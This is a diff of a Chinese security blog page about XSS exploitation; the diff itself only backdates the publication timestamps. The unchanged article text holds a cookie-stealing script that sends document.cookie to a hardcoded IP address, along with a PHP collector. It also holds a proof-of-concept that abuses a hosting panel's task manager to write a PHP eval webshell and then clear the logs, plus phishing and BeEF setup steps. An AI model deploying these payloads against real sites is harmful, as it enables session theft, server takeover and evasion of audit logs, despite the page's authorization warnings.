@@ -19,8 +19,8 @@
 <meta property="og:description" content="XSS 攻击利用示例：凭据盗取、数据提交（业务滥用）、网络钓鱼与溯源综合工具。含 PoC 代码片段与搭建参考。" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="http://www.hzhsec.top/list/base_bug/xss/xss3/" /><meta property="article:section" content="list" />
-<meta property="article:published_time" content="2025-10-16T16:30:00+08:00" />
-<meta property="article:modified_time" content="2025-10-16T16:30:00+08:00" />
+<meta property="article:published_time" content="2024-05-20T16:00:00+08:00" />
+<meta property="article:modified_time" content="2024-05-20T16:00:00+08:00" />
 
 <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="XSS 跨站 — 攻击利用：凭据盗取 / 数据提交 / 网络钓鱼 / 溯源综合"/>
@@ -72,8 +72,8 @@
   "articleBody": "XSS 跨站 — 攻击利用：凭据盗取 / 数据提交 / 网络钓鱼 / 溯源综合 漏洞原理：接受输入数据，输出显示数据后解析执行。\n基础类型：反射(非持续)、存储(持续)、DOM-BASE。\n拓展类型：jquery、mxss、uxss、pdfxss、flashxss、上传xss 等。\n常用资料：https://www.freebuf.com/articles/web/340080.html\n攻击利用：盲打、COOKIE 盗取、凭据窃取、页面劫持、网络钓鱼、权限维持等。\n安全修复：字符过滤、上下文编码、HttpOnly、CSP、防护规则（WAF）等。\n测试流程：先定位输出点 → 决定注入位置 → 注入并观察执行（逐步升级 payload）。\nXSS 跨站 — 攻击利用：凭据盗取 前提条件：目标站点未对关键 Cookie 使用 HttpOnly，或存在其他可读凭据的回显点。\n利用思路：通过 XSS 将受害者的 cookie / 会话凭据发回攻击者控制的服务器。\n触发示例（前端 payload）：\n\u003cscript\u003e var url='http://47.94.236.117/getcookie.php?u='+encodeURIComponent(window.location.href)+'\u0026c='+encodeURIComponent(document.cookie); document.write(\"\"); \u003c/script\u003e 后端接收示例（PHP）：\n\u003c?php $url = $_GET['u']; $cookie = $_GET['c']; $fp = fopen('cookie.txt', \"a\"); fwrite($fp, $url . \"|\" . $cookie . \"\\n\"); fclose($fp); ?\u003e 建议：实际测试时请对敏感数据进行妥善保管，并在授权范围内进行。若 Cookie 设置了 HttpOnly，JS 无法直接读取，这也是首要防护手段之一。\nXSS 跨站 — 攻击利用：数据提交（业务滥用） 思路：当无法直接窃取凭据或凭据受保护时，可以利用受害者已有权限在后台执行业务操作（例如任务管理、日志清理、文件写入等），以间接植入后门或持久化载荷。\n示例场景：利用某面板（示例中为“小皮面板”）的日志 XSS 漏洞，利用 JS 发起对任务管理的请求，创建一个包含反弹 webshell 的计划任务并执行，从而在服务器上写入恶意文件。\n示例 PoC（注：仅作技术演示，务必在授权范围内测试）\n\u003cscript src=\"http://xx.xxx.xxx/poc.js\"\u003e\u003c/script\u003e function poc(){ $.get('/service/app/tasks.php?type=task_list', {}, function(data){ var id = data.data[0].ID; $.post('/service/app/tasks.php?type=exec_task', { tid: id }, function(res2){ $.post('/service/app/log.php?type=clearlog', {}, function(res3){}, \"json\"); }, \"json\"); }, \"json\"); } function save(){ var data = {}; data.task_id = \"\"; data.title = \"test\"; data.exec_cycle = \"1\"; data.week = \"1\"; data.day = \"3\"; data.hour = \"14\"; data.minute = \"20\"; data.shell = 'echo \"\u003c?php @eval($_POST[123]);?\u003e\" \u003eC:/xp.cn/www/wwwroot/admin/localhost_80/wwwroot/1.php'; $.post('/service/app/tasks.php?type=save_shell', data, function(res){ poc(); }, 'json'); } save(); 注意：此类利用属于对业务逻辑的滥用，可能对系统造成严重影响。测试前需获得明确授权并限定时间窗口。\nXSS 跨站 — 攻击利用：网络钓鱼 流程：\n部署可访问的钓鱼页面并准备伪装界面； 在目标站点植入 XSS payload，等待受害者访问并被注入钓鱼页面或重定向到钓鱼页面； 将后门/正常文件捆绑并尝试规避检测（技术与法律风险高）。 参考项目：Fake-flash（示例仓库，用于钓鱼页面构建、界面伪装等）\nhttps://github.com/r00tSe7en/Fake-flash.cn\nXSS 跨站 — 攻击利用：溯源与综合工具 XSSReceiver（XSS 数据接收平台）：简单搭建即可接收 XSS 回传数据，无需数据库或复杂环境。\n项目与搭建参考： https://github.com/epoch99/BlueLotus_XSSReceiver-master\nBeEF（Browser Exploitation Framework）— 浏览器控制框架：通过注入钩子 JS（BeEF hook），可在被控制浏览器上执行各种模块化操作（如指纹采集、命令执行、钓鱼模块等）。\n快速搭建（Docker 示例）：\ndocker run --rm -p 3000:3000 janes/beef 这些工具均为渗透测试与漏洞复现提供便利，请确保在授权范围与合规前提下使用，严禁用于未授权的攻击。\n合规与安全提醒 在进行 XSS 利用测试前，务必持有明确的书面授权与测试范围； 记录测试步骤、时间窗口、产出文件（日志/截图/复现步骤）以便事后审计； 优先在隔离或测试环境复现复核，避免对生产系统产生不可逆影响； 发现高危问题（如能导致凭据盗取或远程代码执行）应立即按流程上报并协助修复。 参考项目与延伸阅读 XSSReceiver: https://github.com/epoch99/BlueLotus_XSSReceiver-master BeEF (Browser Exploitation Framework): https://github.com/beefproject/beef Fake-flash.cn (示例钓鱼页面仓库): https://github.com/r00tSe7en/Fake-flash.cn ",
   "wordCount" : "211",
   "inLanguage": "en",
-  "datePublished": "2025-10-16T16:30:00+08:00",
-  "dateModified": "2025-10-16T16:30:00+08:00",
+  "datePublished": "2024-05-20T16:00:00+08:00",
+  "dateModified": "2024-05-20T16:00:00+08:00",
   "author":{
     "@type": "Person",
     "name": "hzhsec"
@@ -212,7 +212,7 @@
 
   <p>
   <small>
-    October 16, 2025&nbsp;· 211 words&nbsp;· One minute</small>
+    May 20, 2024&nbsp;· 211 words&nbsp;· One minute</small>
 
   
 <p>
